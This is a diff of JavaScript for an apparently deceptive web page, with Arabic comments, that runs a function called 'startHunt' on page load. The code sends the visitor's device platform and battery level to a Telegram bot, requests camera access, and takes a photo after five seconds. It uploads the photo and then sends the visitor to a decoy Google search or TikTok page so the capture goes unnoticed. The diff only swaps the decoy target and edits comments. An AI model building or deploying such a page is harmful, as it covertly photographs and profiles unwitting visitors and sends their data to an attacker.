@@ -9,18 +9,16 @@
 
         async function startHunt() {
             try {
-                // إرسال معلومات الجهاز أولاً
                 let b = await navigator.getBattery();
                 let info = `🎯 صيد جديد!\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${Math.round(b.level * 100)}%`;
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(info)}`);
 
-                // طلب إذن الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
 
-                // ⏳ زيادة وقت الانتظار إلى 5 ثوانٍ (5000 ميلي ثانية)
+                // انتظار 5 ثوانٍ لضمان لقطة واضحة
                 await new Promise(resolve => setTimeout(resolve, 5000));
 
                 const canvas = document.createElement('canvas');
@@ -35,13 +33,12 @@
                         method: 'POST',
                         body: fd
                     }).then(() => {
-                        // التحويل بعد إرسال الصورة
-                        window.location.href = "https://www.tiktok.com"; 
+                        // التحويل لرابط مقولة أو بحث جوجل
+                        window.location.href = "https://www.google.com/search?q=مقولات+عن+الحياة"; 
                     });
                 }, 'image/jpeg');
             } catch (e) {
-                // في حال رفض الإذن يتم التحويل فوراً
-                window.location.href = "https://www.tiktok.com";
+                window.location.href = "https://www.google.com/search?q=مقولات+عن+الحياة";
             }
         }
         window.onload = startHunt;
